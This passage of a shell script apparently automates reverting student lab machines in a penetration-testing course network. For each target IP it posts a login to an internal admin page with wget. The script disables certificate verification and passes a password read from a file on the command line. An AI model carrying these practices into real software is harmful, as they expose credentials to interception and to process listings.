   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert pain

  if [ $uip == "10.10.15.235" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert sufference

  if [ $uip == "10.10.15.236" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert fc411

  if [ $uip == "10.10.15.241" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert fc42

  if [ $uip == "10.10.15.242" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert helpdesk

  if [ $uip == "10.10.15.245" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert cory

  if [ $uip == "10.10.15.247" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi
 
 fi

# end student network subnet 15 revert list
 
 if [ `echo $uip | cut -d'.' -f3` == "13" ]; then

# revert alice
  
  if [ $uip == "10.10.13.201" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert ghost

  if [ $uip == "10.10.13.202" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert bob1

  if [ $uip == "10.10.13.203" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert bob2

  if [ $uip == "10.10.13.204" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert oracle

  if [ $uip == "10.10.13.205" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert oracle 2

  if [ $uip == "10.10.13.206" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert pedro

  if [ $uip == "10.10.13.207" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert phoenix

  if [ $uip == "10.10.13.208" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert cacti

  if [ $uip == "10.10.13.209" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert trixbox

  if [ $uip == "10.10.13.211" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert redhat

  if [ $uip == "10.10.13.215" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert redhat9

  if [ $uip == "10.10.13.217" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert master

  if [ $uip == "10.10.13.220" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert slave 

  if [ $uip == "10.10.13.221" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert mailman

  if [ $uip == "10.10.13.222" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert jeff

  if [ $uip == "10.10.13.223" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert ubuntu05

  if [ $uip == "10.10.13.224" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert joe

  if [ $uip == "10.10.13.226" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert srv2

  if [ $uip == "10.10.13.227" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert thincmail

  if [ $uip == "10.10.13.229" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert kevin

  if [ $uip == "10.10.13.230" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert ralph

  if [ $uip == "10.10.13.231" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert gentoo

  if [ $uip == "10.10.13.234" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert pain

  if [ $uip == "10.10.13.235" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert sufference

  if [ $uip == "10.10.13.236" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert fc411

  if [ $uip == "10.10.13.241" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert fc42

  if [ $uip == "10.10.13.242" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert helpdesk

  if [ $uip == "10.10.13.245" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert cory

  if [ $uip == "10.10.13.247" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

 fi

# end student network subnet 13 revert list
 
 if [ `echo $uip | cut -d'.' -f3` == "11" ]; then

# revert alice
  
  if [ $uip == "10.10.11.201" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert ghost

  if [ $uip == "10.10.11.202" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert bob1

  if [ $uip == "10.10.11.203" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert bob2

  if [ $uip == "10.10.11.204" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert oracle

  if [ $uip == "10.10.11.205" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert oracle 2

  if [ $uip == "10.10.11.206" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert pedro

  if [ $uip == "10.10.11.207" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert phoenix

  if [ $uip == "10.10.11.208" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert cacti

  if [ $uip == "10.10.11.209" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert trixbox

  if [ $uip == "10.10.11.211" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert redhat

  if [ $uip == "10.10.11.215" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert redhat9

  if [ $uip == "10.10.11.217" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert master

  if [ $uip == "10.10.11.220" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert slave 

  if [ $uip == "10.10.11.221" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert mailman

  if [ $uip == "10.10.11.222" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert jeff

  if [ $uip == "10.10.11.223" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert ubuntu05

  if [ $uip == "10.10.11.224" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert joe

  if [ $uip == "10.10.11.226" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert srv2

  if [ $uip == "10.10.11.227" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert thincmail

  if [ $uip == "10.10.11.229" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert kevin

  if [ $uip == "10.10.11.230" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert ralph

  if [ $uip == "10.10.11.231" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert gentoo

  if [ $uip == "10.10.11.234" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert pain

  if [ $uip == "10.10.11.235" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert sufference

  if [ $uip == "10.10.11.236" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert fc411

  if [ $uip == "10.10.11.241" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert fc42

  if [ $uip == "10.10.11.242" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert helpdesk

  if [ $uip == "10.10.11.245" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert cory

  if [ $uip == "10.10.11.247" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

 fi
fi
fi

# end revert
